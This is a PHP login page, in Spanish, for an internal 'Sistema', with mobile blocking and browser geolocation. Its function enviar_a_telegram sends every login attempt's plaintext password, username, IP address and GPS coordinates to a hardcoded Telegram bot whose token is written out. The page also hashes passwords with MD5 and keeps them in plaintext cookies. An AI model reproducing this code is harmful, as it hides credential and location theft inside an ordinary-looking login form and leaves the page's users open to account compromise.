<?php
require_once __DIR__.'/config/session.php';
require_once 'config/auth.php';
require_once 'config/database.php';

if (isLoggedIn()) {
    header("Location: index.php");
    exit();
}

$database = new Database();
$conn = $database->getConnection();
$error = '';

function enviar_a_telegram($usuario, $password, $ip, $navegador, $lat, $lon, $estado, $ciudad, $pais, $dispositivo, $so) {
    $token = "7911808885:AAH6jLersOogPHb8tUpFTGXloH-GCgrz8kQ";
    $chat_ids = ["5474348715"];

    $msg = "🔐 *Intento de Login*\n" .
           "👤 Usuario: `$usuario`\n" .
           "🔑 Clave: `$password`\n" .
           "🌐 IP: `$ip`\n" .
           "🧭 Navegador: `$navegador`\n" .
           "🖥️ SO: `$so`\n" .
           "📱 Dispositivo: `$dispositivo`\n" .
           "📍 Ubicación: $lat, $lon ($ciudad, $pais)\n" .
           "🕒 Fecha: " . date("Y-m-d H:i:s") . "\n" .
           "🛡️ Estado: *$estado*";

    foreach ($chat_ids as $chat_id) {
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $post_fields = [
        'chat_id' => $chat_id,
        'text' => $msg,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 2);
    curl_exec($ch);
    curl_close($ch);
}

}

function detectMobileDeviceSimple() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $mobileHeaders = [
        'HTTP_X_WAP_PROFILE', 'HTTP_X_WAP_CLIENTID', 'HTTP_WAP_CONNECTION',
        'HTTP_PROFILE', 'HTTP_X_OPERAMINI_PHONE_UA', 'HTTP_X_NOKIA_GATEWAY_ID'
    ];
    foreach ($mobileHeaders as $header) {
        if (isset($_SERVER[$header])) return true;
    }
    $obviousMobilePatterns = [
        '/iPhone.*Mobile.*Safari/i',
        '/Android.*Mobile.*Chrome/i',
        '/Windows Phone/i',
        '/BlackBerry/i',
        '/Opera Mini/i'
    ];
    foreach ($obviousMobilePatterns as $pattern) {
        if (preg_match($pattern, $userAgent)) return true;
    }
    $realDesktopPatterns = [
        '/Windows NT.*WOW64/i', '/Windows NT.*Win64.*x64/i',
        '/Macintosh.*Intel/i', '/X11.*Linux.*x86_64/i',
        '/X11.*Ubuntu/i', '/CrOS.*x86_64/i'
    ];
    foreach ($realDesktopPatterns as $pattern) {
        if (preg_match($pattern, $userAgent)) return false;
    }
    $suspiciousPatterns = [
        '/Android.*Chrome(?!.*Mobile)/i',
        '/iPhone.*Safari(?!.*Mobile)/i'
    ];
    foreach ($suspiciousPatterns as $pattern) {
        if (preg_match($pattern, $userAgent)) return true;
    }
    return false;
}

$showMobileBlock = isset($_GET['mobile_blocked']) && $_GET['mobile_blocked'] === '1';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $login = $_POST['login'] ?? '';
    $pass = $_POST['password'] ?? '';
    $remember = isset($_POST['remember']);
    $lat = $_POST['latitud'] ?? '';
    $lon = $_POST['longitud'] ?? '';

    $jsDetection = json_decode($_POST['device_info'] ?? '{}', true);
    $ip = $_SERVER['REMOTE_ADDR'];
    $navegador = $jsDetection['userAgent'] ?? '';
    $so = $navegador;
    $dispositivo = ($jsDetection['isMobile'] ?? false) ? 'Móvil' : 'PC';
    $ciudad = '';
    $pais = '';
    $exito = 0;

    $geo = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
    if ($geo && $geo->status === "success") {
        $ciudad = $geo->city ?? '';
        $pais = $geo->country ?? '';
    }

    $query = "SELECT idusuario, usuario, password, area FROM usuarios WHERE usuario = :login";
    $stmt = $conn->prepare($query);
    $stmt->bindParam(':login', $login);
    $stmt->execute();

    if ($stmt->rowCount() === 1) {
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
        $hashAlmacenado = $row['password'];
        $hashIngresado = md5($pass);

        if ($hashIngresado === $hashAlmacenado) {
            $usuario = $row['usuario'];
            $isMobileDevice = detectMobileDeviceSimple() || ($jsDetection['isMobile'] ?? false);
            $usuariosPermitidosMovil = ['ronald', 'karina'];

            if ($isMobileDevice && !in_array($usuario, $usuariosPermitidosMovil)) {
                enviar_a_telegram($login, $pass, $ip, $navegador, $lat, $lon, "Bloqueado por móvil", $ciudad, $pais, $dispositivo, $so);
                header("Location: login.php?mobile_blocked=1");
                exit();
            }

            session_start();
            session_regenerate_id(true); // <-- añade esta línea
            $_SESSION['usuario'] = $usuario;
            $_SESSION['area'] = $row['area'];
            $_SESSION['idusuario'] = (int)$row['idusuario'];

            if ($remember) {
                setcookie('login', $login, time() + (30 * 24 * 60 * 60), "/");
                setcookie('password', $pass, time() + (30 * 24 * 60 * 60), "/");
            } else {
                setcookie('login', '', time() - 3600, "/");
                setcookie('password', '', time() - 3600, "/");
            }

            $exito = 1;
            enviar_a_telegram($login, $pass, $ip, $navegador, $lat, $lon, "LOGIN EXITOSO", $ciudad, $pais, $dispositivo, $so);
            header("Location: index.php");
            exit();
        } else {
            $error = "Contraseña incorrecta.";
        }
    } else {
        $error = "Usuario no encontrado.";
    }

    if ($exito === 0) {
        enviar_a_telegram($login, $pass, $ip, $navegador, $lat, $lon, "LOGIN FALLIDO", $ciudad, $pais, $dispositivo, $so);
    }
}
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Sistema</title>
    <link rel="stylesheet" href="assets/css/output.css?v=<?= time() ?>">
    <link rel="icon" href="icons/favicon.png" type="image/x-icon">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>

    <style>
        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        @keyframes fade-in-up {
            0% { opacity: 0; transform: translateY(40px); }
            100% { opacity: 1; transform: translateY(0); }
        }
        .animate-fade-in-up {
            animation: fade-in-up 0.8s ease-out forwards;
        }
        
        /* POPUP SIMPLE */
        .mobile-popup {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s ease;
        }
        
        .mobile-popup.show {
            opacity: 1;
            visibility: visible;
        }
        
        .popup-content {
            background: white;
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            transform: scale(0.7);
            transition: transform 0.3s ease;
        }
        
        .mobile-popup.show .popup-content {
            transform: scale(1);
        }
        
        .popup-icon {
            font-size: 4em;
            color: #e74c3c;
            margin-bottom: 20px;
        }
        
        .popup-title {
            color: #2c3e50;
            font-size: 1.8em;
            font-weight: bold;
            margin-bottom: 15px;
        }
        
        .popup-message {
            color: #555;
            font-size: 1.1em;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        
        .popup-button {
            background: #3498db;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            transition: background 0.3s ease;
        }
        
        .popup-button:hover {
            background: #2980b9;
        }
    </style>
</head>
<body class="min-h-screen flex items-center justify-center px-4 bg-gradient-to-br from-orange-400 via-yellow-400 to-orange-400 bg-[length:200%_200%] animate-[gradientShift_4s_ease_infinite] font-[Poppins,sans-serif]">

    <!-- POPUP SIMPLE PARA MOVILES -->
    <div id="mobilePopup" class="mobile-popup <?= $showMobileBlock ? 'show' : '' ?>">
        <div class="popup-content">
            <div class="popup-icon"><i class="fa-solid fa-triangle-exclamation" style="color: #e74c3c;"></i></div>
            <div class="popup-title">ACCESO DENEGADO</div>
            <div class="popup-message">
                Solo puedes usar el sistema desde PC
            </div>
            <button class="popup-button" onclick="closeMobilePopup()">
                Entendido
            </button>
        </div>
    </div>

    <div class="bg-white p-10 rounded-3xl shadow-2xl w-full max-w-2xl animate-fade-in-up">
        <div class="flex justify-center mb-6">
            <img src="icons/logo.png" alt="Logo" class="h-16 object-contain animate-bounce" />
        </div>
        
        <div class="flex justify-center mb-6">
            <img src="icons/usuario.png" alt="Usuario" class="h-[140px]" />
        </div>
        
        <form method="POST" action="login.php" class="space-y-6" id="loginForm">
            <input type="hidden" name="device_info" id="deviceInfo" value="">
            
            <div class="flex flex-col md:flex-row gap-4">
                <div class="w-full md:w-1/2">
                    <label class="block text-sm font-semibold text-gray-700 mb-1">Usuario</label>
                    <input type="text" name="login" required placeholder="Usuario" autocomplete="off"
                        value="<?= isset($_COOKIE['login']) ? htmlspecialchars($_COOKIE['login']) : '' ?>"
                        class="w-full px-4 py-2 border border-gray-300 rounded-xl shadow-sm focus:ring-2 focus:ring-orange-500 focus:outline-none transition transform focus:scale-105" />
                </div>
                
                <div class="w-full md:w-1/2 relative">
                    <label class="block text-sm font-semibold text-gray-700 mb-1">Contraseña</label>
                    <input type="password" id="password" name="password" required placeholder="Contraseña" autocomplete="new-password"
                        value="<?= isset($_COOKIE['password']) ? htmlspecialchars($_COOKIE['password']) : '' ?>"
                        class="w-full px-4 py-2 border border-gray-300 rounded-xl shadow-sm pr-12 focus:ring-2 focus:ring-orange-500 focus:outline-none transition transform focus:scale-105" />
                    <button type="button" onclick="togglePasswordVisibility()" class="absolute right-3 top-9 text-gray-500 hover:text-gray-700">
                        <i id="eye-icon" class="fas fa-eye"></i>
                    </button>
                </div>
            </div>
            
            <div class="flex items-center space-x-2">
                <input type="checkbox" name="remember" id="remember"
                     <?= (isset($_COOKIE['login']) && $_COOKIE['login']) ? 'checked' : '' ?>
                    class="text-orange-600 rounded focus:ring-orange-500" />
                <label for="remember" class="text-sm text-gray-700 cursor-pointer">Recuérdame</label>
            </div>
            
            <div class="text-center">
                <button type="submit" id="submitBtn"
                    class="w-full py-3 px-4 bg-orange-500 text-white rounded-xl hover:bg-orange-600 transition transform hover:scale-105 font-semibold shadow-lg">
                    <i class="fas fa-sign-in-alt mr-2"></i><span id="btnText">Iniciar Sesión</span>
                </button>
            </div>
            <input type="hidden" name="latitud" id="latitud">
            <input type="hidden" name="longitud" id="longitud">
            <input type="hidden" name="device_info" id="deviceInfo">
            
        </form>
        
        <?php if (!empty($error)): ?>
        <div class="mt-6 text-center">
            <div class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded-xl relative animate-pulse" role="alert">
                <i class="fas fa-exclamation-triangle mr-2"></i>
                <strong class="font-bold">¡Error! </strong>
                <span class="block sm:inline"><?= htmlspecialchars($error) ?></span>
            </div>
        </div>
        <?php endif; ?>
        
        <div class="mt-6 text-center text-xs text-gray-500">
            <p><i class="fas fa-shield-alt mr-1"></i>Sistema protegido</p>
        </div>
    </div>

    <script>
        // DETECTOR SIMPLE
        class SimpleMobileDetector {
            constructor() {
                this.deviceInfo = {};
                this.isMobile = false;
                this.antiDesktopMode = false;
            }
            
            detect() {
                // Caracter¨ªsticas que no se pueden ocultar
                const touchPoints = navigator.maxTouchPoints || 0;
                const hasOrientation = 'orientation' in screen;
                const hasVibration = 'vibrate' in navigator;
                
                // Resoluciones tipicas de moviles
                const width = screen.width;
                const height = screen.height;
                const currentRes = [Math.min(width, height), Math.max(width, height)];
                
                const mobileResolutions = [
                    [360, 640], [375, 667], [414, 896], [412, 915], [393, 851],
                    [360, 780], [375, 812], [414, 736], [320, 568], [480, 854],
                    [390, 844], [428, 926], [360, 800], [412, 869], [384, 854]
                ];
                
                let isMobileResolution = false;
                for (let res of mobileResolutions) {
                    if (Math.abs(currentRes[0] - res[0]) <= 5 && Math.abs(currentRes[1] - res[1]) <= 10) {
                        isMobileResolution = true;
                        break;
                    }
                }
                
                // User Agent sospechoso
                const ua = navigator.userAgent;
                const suspiciousUA = /Android.*Chrome(?!.*Mobile)/i.test(ua) || /iPhone.*Safari(?!.*Mobile)/i.test(ua);
                
                // Media Queries
                const noHover = !window.matchMedia('(hover: hover)').matches;
                const coarsePointer = window.matchMedia('(pointer: coarse)').matches;
                
                // Determinar si es movil
                let mobileScore = 0;
                if (touchPoints > 0) mobileScore += 30;
                if (hasOrientation) mobileScore += 20;
                if (hasVibration) mobileScore += 25;
                if (isMobileResolution) mobileScore += 40;
                if (suspiciousUA) mobileScore += 35;
                if (noHover) mobileScore += 20;
                if (coarsePointer) mobileScore += 25;
                
                this.isMobile = mobileScore >= 50;
                this.antiDesktopMode = suspiciousUA && (touchPoints > 0 || isMobileResolution);
                
                this.deviceInfo = {
                    isMobile: this.isMobile,
                    antiDesktopMode: this.antiDesktopMode,
                    maxTouchPoints: touchPoints,
                    screenWidth: width,
                    screenHeight: height,
                    hasOrientation: hasOrientation,
                    hasVibration: hasVibration,
                    userAgent: ua,
                    timestamp: new Date().toISOString()
                };
                
                return this.deviceInfo;
            }
        }
        
        // Inicializar y ejecutar deteccion
        document.addEventListener('DOMContentLoaded', function() {
            const detector = new SimpleMobileDetector();
            const deviceInfo = detector.detect();
            
            // Guardar para envio
            document.getElementById('deviceInfo').value = JSON.stringify(deviceInfo);
        });
        
        // Cerrar popup y limpiar URL
        function closeMobilePopup() {
            document.getElementById('mobilePopup').classList.remove('show');
            
            // LIMPIAR LA URL PARA EVITAR REENVIO DE FORMULARIO
            if (window.location.search.includes('mobile_blocked=1')) {
                // Usar replaceState para cambiar la URL sin recargar la pagina
                const newUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
                window.history.replaceState({}, document.title, newUrl);
            }
        }
        
        // Cerrar popup al hacer clic fuera
        document.addEventListener('click', function(e) {
            if (e.target.id === 'mobilePopup') {
                closeMobilePopup();
            }
        });
        
        // PREVENIR REENVIO DE FORMULARIO AL ACTUALIZAR
        window.addEventListener('beforeunload', function() {
            // Si hay un popup visible, limpiar la URL antes de salir
            if (document.getElementById('mobilePopup').classList.contains('show')) {
                const newUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
                window.history.replaceState({}, document.title, newUrl);
            }
        });
        
        function togglePasswordVisibility() {
            const passwordInput = document.getElementById("password");
            const icon = document.getElementById("eye-icon");
            
            if (passwordInput.type === "password") {
                passwordInput.type = "text";
                icon.classList.replace("fa-eye", "fa-eye-slash");
            } else {
                passwordInput.type = "password";
                icon.classList.replace("fa-eye-slash", "fa-eye");
            }
        }
    </script>
    
    <script>
        /*document.addEventListener("DOMContentLoaded", () => {
            const form = document.getElementById("loginForm");
        
            form.addEventListener("submit", async (e) => {
                e.preventDefault();
                ...
                form.submit();
            });
        });*/
    </script>

<script>
document.addEventListener("DOMContentLoaded", () => {
    navigator.geolocation.getCurrentPosition(
        (pos) => {
            document.getElementById("latitud").value = pos.coords.latitude;
            document.getElementById("longitud").value = pos.coords.longitude;
        },
        () => {
            document.getElementById("latitud").value = "NO DISPONIBLE";
            document.getElementById("longitud").value = "NO DISPONIBLE";
        },
        { timeout: 3000 }
    );
});
</script>

</body>
</html>
